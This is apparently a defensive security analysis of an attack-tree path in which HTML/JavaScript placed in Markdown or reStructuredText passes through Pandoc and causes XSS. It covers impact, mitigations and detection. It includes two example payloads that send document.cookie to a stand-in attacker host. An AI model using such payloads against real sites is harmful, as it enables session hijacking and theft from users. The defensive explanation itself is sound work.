## Deep Analysis of Attack Tree Path: Inject HTML/JS in Markdown/RST

This analysis delves into the attack tree path "Inject HTML/JS in Markdown/RST" within the context of an application using Pandoc. We will examine the attack's mechanics, potential impact, necessary conditions, mitigation strategies, and detection methods.

**Attack Tree Path:** Inject HTML/JS in Markdown/RST

**Description:** Attackers embed malicious HTML or JavaScript within Markdown or RST content. If Pandoc's output is directly rendered in a web browser without sanitization, the injected JavaScript can execute in the user's browser (XSS). If the server-side application mishandles this output, it could potentially lead to Remote Code Execution (RCE).

**Detailed Breakdown:**

**1. Attack Vector:**

* **Input Manipulation:** The attacker leverages the ability to provide input in Markdown or RST formats. These formats, while designed for text formatting, allow for embedding raw HTML and sometimes JavaScript (depending on the specific syntax and Pandoc's configuration).
* **Embedding Malicious Code:** The attacker crafts Markdown or RST content that includes `<script>` tags containing malicious JavaScript or other HTML elements designed to execute scripts (e.g., `<img>` with `onerror`).

**Example (Markdown):**

```markdown
This is some text.

<script>
  // Malicious JavaScript code
  window.location.href = 'https://attacker.example.com/steal?cookie=' + document.cookie;
</script>

More text.
```

**Example (reStructuredText):**

```rst
This is some text.

.. raw:: html

   <script>
     // Malicious JavaScript code
     window.location.href = 'https://attacker.example.com/steal?cookie=' + document.cookie;
   </script>

More text.
```

**2. Pandoc's Role:**

* **Conversion:** Pandoc's primary function is to convert documents between various markup formats. When processing Markdown or RST containing embedded HTML/JS, Pandoc will, by default, pass these elements through to the output format (e.g., HTML).
* **No Default Sanitization:** Pandoc is a conversion tool, not a security tool. It does not inherently sanitize or remove potentially harmful HTML or JavaScript. This is a deliberate design choice to maintain flexibility and allow for complex document structures.
* **Configuration Options:** While Pandoc doesn't sanitize by default, it offers options that *can* influence the output and potentially mitigate this attack. For example, using `--safe` mode or specific filters can restrict or modify the output. However, relying solely on these options might not be sufficient for robust security.

**3. Exploitation Scenarios:**

* **Client-Side Exploitation (Cross-Site Scripting - XSS):**
    * **Vulnerability:** The web application rendering Pandoc's output directly in the user's browser without proper sanitization.
    * **Mechanism:** The browser interprets the injected `<script>` tag and executes the malicious JavaScript.
    * **Impact:**
        * **Session Hijacking:** Stealing user cookies to impersonate them.
        * **Credential Theft:** Capturing user input from forms on the page.
        * **Redirection to Malicious Sites:** Redirecting users to phishing pages or sites hosting malware.
        * **Defacement:** Modifying the content of the web page.
        * **Keylogging:** Recording user keystrokes.
        * **Information Disclosure:** Accessing sensitive information displayed on the page.

* **Server-Side Exploitation (Potential Remote Code Execution - RCE):**
    * **Vulnerability:** The server-side application processes Pandoc's output in a way that allows for the execution of the injected code. This is less common but possible in specific scenarios.
    * **Mechanism:**
        * **Server-Side Rendering with Vulnerable Libraries:** If the server uses a library to render the HTML output that is vulnerable to code injection based on specific HTML constructs (though less likely with modern libraries).
        * **Dynamic Code Generation:** If the server-side application dynamically generates code based on Pandoc's output without proper escaping or sanitization. For example, using the output to construct shell commands.
        * **File Inclusion Vulnerabilities:** In rare cases, if the injected HTML somehow triggers the inclusion of external files controlled by the attacker.
    * **Impact:**
        * **Complete System Compromise:** The attacker can execute arbitrary commands on the server.
        * **Data Breach:** Accessing and exfiltrating sensitive data stored on the server.
        * **Denial of Service (DoS):** Disrupting the server's availability.
        * **Malware Installation:** Installing malicious software on the server.

**4. Prerequisites for Successful Exploitation:**

* **Attacker Capability:** The attacker must be able to provide input in Markdown or RST format that is processed by Pandoc.
* **Lack of Sanitization:** The primary prerequisite is the absence of proper sanitization of Pandoc's output *before* it is rendered in a web browser or processed by the server-side application.
* **Vulnerable Rendering/Processing:** For XSS, the web browser must directly interpret the unsanitized HTML. For RCE, the server-side application must handle the output in a vulnerable manner.

**5. Mitigation Strategies:**

* **Client-Side Sanitization (Essential for XSS Prevention):**
    * **Output Encoding/Escaping:**  Encode or escape the HTML output generated by Pandoc before rendering it in the browser. This converts potentially harmful characters into their safe equivalents (e.g., `<` becomes `&lt;`). This is the most crucial step.
    * **Content Security Policy (CSP):** Implement a strong CSP to control the resources the browser is allowed to load and execute. This can significantly reduce the impact of XSS by restricting inline scripts and the sources from which scripts can be loaded.
    * **Templating Engines with Auto-Escaping:** Utilize templating engines that automatically escape output by default.

* **Server-Side Sanitization (Important for RCE Prevention and Defence in Depth):**
    * **Input Validation:** While not directly related to Pandoc's output, validate and sanitize user input *before* it is processed by Pandoc. This can prevent the injection of malicious code in the first place.
    * **Secure Processing of Pandoc Output:** If the server-side application needs to process Pandoc's output, do so in a secure manner. Avoid directly executing code based on the output. If dynamic code generation is necessary, ensure proper escaping and sandboxing.
    * **Principle of Least Privilege:** Run the Pandoc process and any server-side processes handling its output with the minimum necessary privileges.

* **Pandoc Configuration (Limited Mitigation):**
    * **`--safe` Mode:** This option disables potentially unsafe features, including raw HTML and JavaScript. However, it might also restrict legitimate use cases.
    * **Filters:** Use Pandoc filters (written in Lua or other languages) to modify the output and remove or sanitize potentially harmful elements. This requires careful development and maintenance of the filters.

**6. Detection Methods:**

* **Static Analysis:** Analyze the application's code to identify areas where Pandoc's output is rendered or processed without proper sanitization. Look for code patterns that directly output Pandoc's results to the browser or use it in potentially vulnerable server-side operations.
* **Dynamic Analysis (Penetration Testing):**
    * **Manual Testing:** Inject various HTML and JavaScript payloads into Markdown/RST input fields and observe if the code is executed in the browser or if the server exhibits unexpected behavior.
    * **Automated Scanning:** Use web application security scanners that can identify XSS vulnerabilities by injecting and testing various payloads.
* **Security Audits:** Conduct regular security audits of the application's codebase and infrastructure to identify potential vulnerabilities related to Pandoc's output handling.
* **Web Application Firewalls (WAFs):** Deploy a WAF that can detect and block malicious requests containing suspicious HTML or JavaScript patterns. However, WAFs are not a foolproof solution and should be used in conjunction with proper sanitization.
* **Content Security Policy (CSP) Reporting:** If CSP is implemented, monitor CSP violation reports to identify instances where injected scripts are being blocked.

**7. Real-World Examples:**

* **Blog Platforms:** If a blog platform uses Pandoc to convert user-submitted Markdown posts to HTML and renders the output directly without sanitization, an attacker could inject malicious JavaScript to steal administrator sessions or deface the blog.
* **Documentation Generators:** A documentation generator using Pandoc to convert RST files to HTML might be vulnerable if it allows users to contribute content and doesn't sanitize the output before publishing it online.
* **Internal Tools:** Even internal applications that process Markdown or RST using Pandoc can be vulnerable if the output is displayed in a web browser without proper security measures.

**8. Pandoc's Responsibility:**

It's crucial to understand that **Pandoc itself is not inherently vulnerable**. The vulnerability lies in how the *application* using Pandoc handles its output. Pandoc is a powerful and flexible tool, and its design prioritizes conversion capabilities over built-in security measures.

**The responsibility for preventing this attack lies with the development team building the application that utilizes Pandoc.** They must implement proper sanitization and security measures to protect users and the application itself.

**Conclusion:**

The "Inject HTML/JS in Markdown/RST" attack path highlights a common vulnerability when using conversion tools like Pandoc. While Pandoc is a valuable tool, developers must be acutely aware of the potential for injecting malicious code through its input formats. Robust mitigation strategies, particularly output sanitization and the implementation of CSP, are essential to prevent XSS attacks. Furthermore, secure server-side processing of Pandoc's output is crucial to avoid potential RCE scenarios. By understanding the mechanics of this attack and implementing appropriate security measures, development teams can effectively mitigate this risk and build secure applications that leverage the power of Pandoc.
